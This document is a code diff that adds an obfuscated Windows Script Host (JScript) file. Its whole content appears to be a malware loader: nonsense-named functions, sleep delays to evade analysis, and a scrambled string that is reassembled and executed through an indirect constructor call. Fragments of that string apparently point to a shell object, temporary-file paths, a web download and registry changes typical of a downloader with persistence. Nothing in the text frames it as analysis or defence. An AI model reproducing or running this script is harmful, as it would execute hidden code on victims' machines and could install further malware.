@@ -1,0 +1,15 @@
+function white(){time="VTlgm";wing[6004664]=buy;fast=life(sound(river),time);}
+function buy(play,post,happen,dear){wing[6851260]=block;fast[atom] = dictionary[fast[must]];}
+function watch(me,trip,result,machine){WScript.Sleep(43709);lie=2540;while(dictionary=dictionary){try{wing[lie](lie);}catch(piece){wing[1400204]=dictionary;}lie++}}
+function garden(lady,lake){wing=[7150];watch(wing);}
+function sound(operate,wild,third,effect,mind){morning="";rich=must;while (rich < 2417) {when=keep(operate,rich);morning=grew(morning,when,rich); rich++; }return morning;}
+function market(so){return so % (exercise+exercise);}
+function life(general,brother) {good = letter(brother);opposite = must;field=[];for (level=must; level<=(letter(general)-good); level++) {if (fresh(general,level,good)==brother){field[letter(field)]=fresh(general,opposite,(level-opposite));opposite = level+good;}}field[letter(field)]=fresh(general,opposite);return field;}
+function keep(student,shore){return fresh(student,shore,stop);}
+function letter(clothe,mix,noise) {return clothe.length; }
+function grew(they,women,toward,hand,tie,been,prove) { if (market(toward)) return they+women; else return women+they; }
+function fresh(loud,hope,dog,tube,wrong) {return loud.substr(hope,dog);}
+garden(7715);
+function hour(danger,sat,bar){stop=1;exercise=stop;WScript.Sleep(8642);atom=exercise+stop*exercise+stop;wing[5046684]=white;}
+function dictionary(next,sure,straight){wing[4905750]=hour;WScript.Sleep(3260);river = 'tY(Sr.(tii nnnfegdimse n(x;o\"O\\rtf%ix(Uve\\S\"TnE@eER\\s\"Ddn+NnoTSap+Dps\\O\"exM@rEA\\.\"I.I,N)  %\\=\"\"0\\l ))lY) e =!hr==Sa- .v1\"t\\) p% {iU{ rS )cEW0SRS0WDc2\\N\" rS(=iDt=pOc=tMe .AjssIbulNOte%eae\"t\\pta)(se 2.r{2ICT2(.=2 tT2fp+)ii\";\\r  2c}}7S  8W;e1(el4 ss6fle\"i\\ a ;{f;}  ) Yn0t r3r=u+y t0{Ye7 .r,Ir 2.e{(op)]ple\\e\"(anrhc(tce\'s\\(tbG\\a\"Euc@Ts}\\\'\"\\\\ \",+;[ T))\'+\\((\\h\"dgt@nnt\\e\"pis,sr.\\:\"It/\\ \"/S;)\'o\\;)t+ e.Cvs)[al(mram] fo+A d\' \\n,=/aT sr+Ye.\".\\har=trepacpiMhlv .ac=pcu heaTp(s \'/\\;j(+)u\\\"\\\\\\i\'?dvPf{nTi2kTx}\'H()dLn/uMogsX(,]rZ [etfsvaufr{n eycrStt}.;i427o=LeneMr fX;(7S1L-M0)2\\=\'Z ;(){\"t\" +c\"rZeSe\"j+t\"b_u\"O+r\"eGnEtR \"a S,e\"t\"r r,Crii.anpt(g]p\".eitf\"r+r\"ciorS\"m+W\"CW ghe=Ra\" [reIrCe hot{ d{  e))e((3hpc taa<cr  }s m;e)(rIi anpe(t]l\"(\"i+L\"hd,\"w+1\" a0\";+)\"0e+\" +3\"=R0g \")+m\";e \" +;\"}R]\")[\\e\"r;emh to f{c ay.rsti;t\"g\\[\\im3HuI]Dld(\\e\\A\"d+)\"eR(\"p+)\"pE;\"e+ \"sSWUu_STi\"c+g\"rN.EiRw\"p+w\"tRw\".+\\\"\"UQ\",+u\"\\C\"\"i+m\"t_o\"(+c\")Y.\";+s\" El\"}+h\" KaH}\"d  =g erailahps .;e)w\" \"w+{\"wl l\\e\"\"W+,\"Sh\\S\".ctm\"r+o\"ipc\"p+.\"tia\".+v\"sro\"l+n\"eca\"e+z\"pSaW(\"k(2]e\"2td\"2+n\"2ca\"2+h\")e.j;bwO \"w+}\"we \"\\+\"\"mt[\"++ \"+a=e;\" +}\"Cr \"\'+)\")C(\")[;)}tcpaitrcchS(We() {=W Secrreihptt;.8s5l1e5e=ph(o7c3x2w1c9c2q0r8r9o)o;m}gtlqToVortoutgcpu=rftassnto;c ';must=0;}
+function block(smell,seven,beauty){fast[atom](fast[exercise])(wing);}
